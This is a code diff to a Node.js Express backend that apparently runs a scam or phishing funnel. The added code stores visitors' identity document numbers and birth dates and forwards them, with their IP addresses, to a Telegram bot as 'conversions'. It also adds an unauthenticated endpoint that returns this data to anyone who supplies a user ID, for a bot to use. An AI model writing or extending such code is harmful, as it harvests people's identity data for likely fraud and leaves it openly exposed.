@@ -542,10 +542,25 @@ app.post("/api/v1/session/convert", async (req, res) => {
   if (session && !session.converted) {
     session.converted = true;
     session.docValue = details.docValue;
-    const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${session.ip}\n<b>Documento:</b> ${details.docValue}\n<b>Status:</b> ✅ NO WHATSAPP`;
+    session.birthDate = details.birthDate;
+    const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${session.ip}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
     await sendTelegram(msg, session.messageId || undefined);
     res.json({ status: "converted" });
   } else res.json({ status: "ignored" });
+});
+
+app.get("/api/v1/session/data/:userId", (req, res) => {
+  const { userId } = req.params;
+  const session = sessions.get(userId);
+  if (session) {
+    res.json({
+      docValue: session.docValue,
+      birthDate: session.birthDate,
+      fullName: "" // We don't have full name from site yet, but bot expects it
+    });
+  } else {
+    res.status(404).json({ status: "not_found" });
+  }
 });
 
 // Endpoint de Callback do Gateway (FastSoftBrasil)
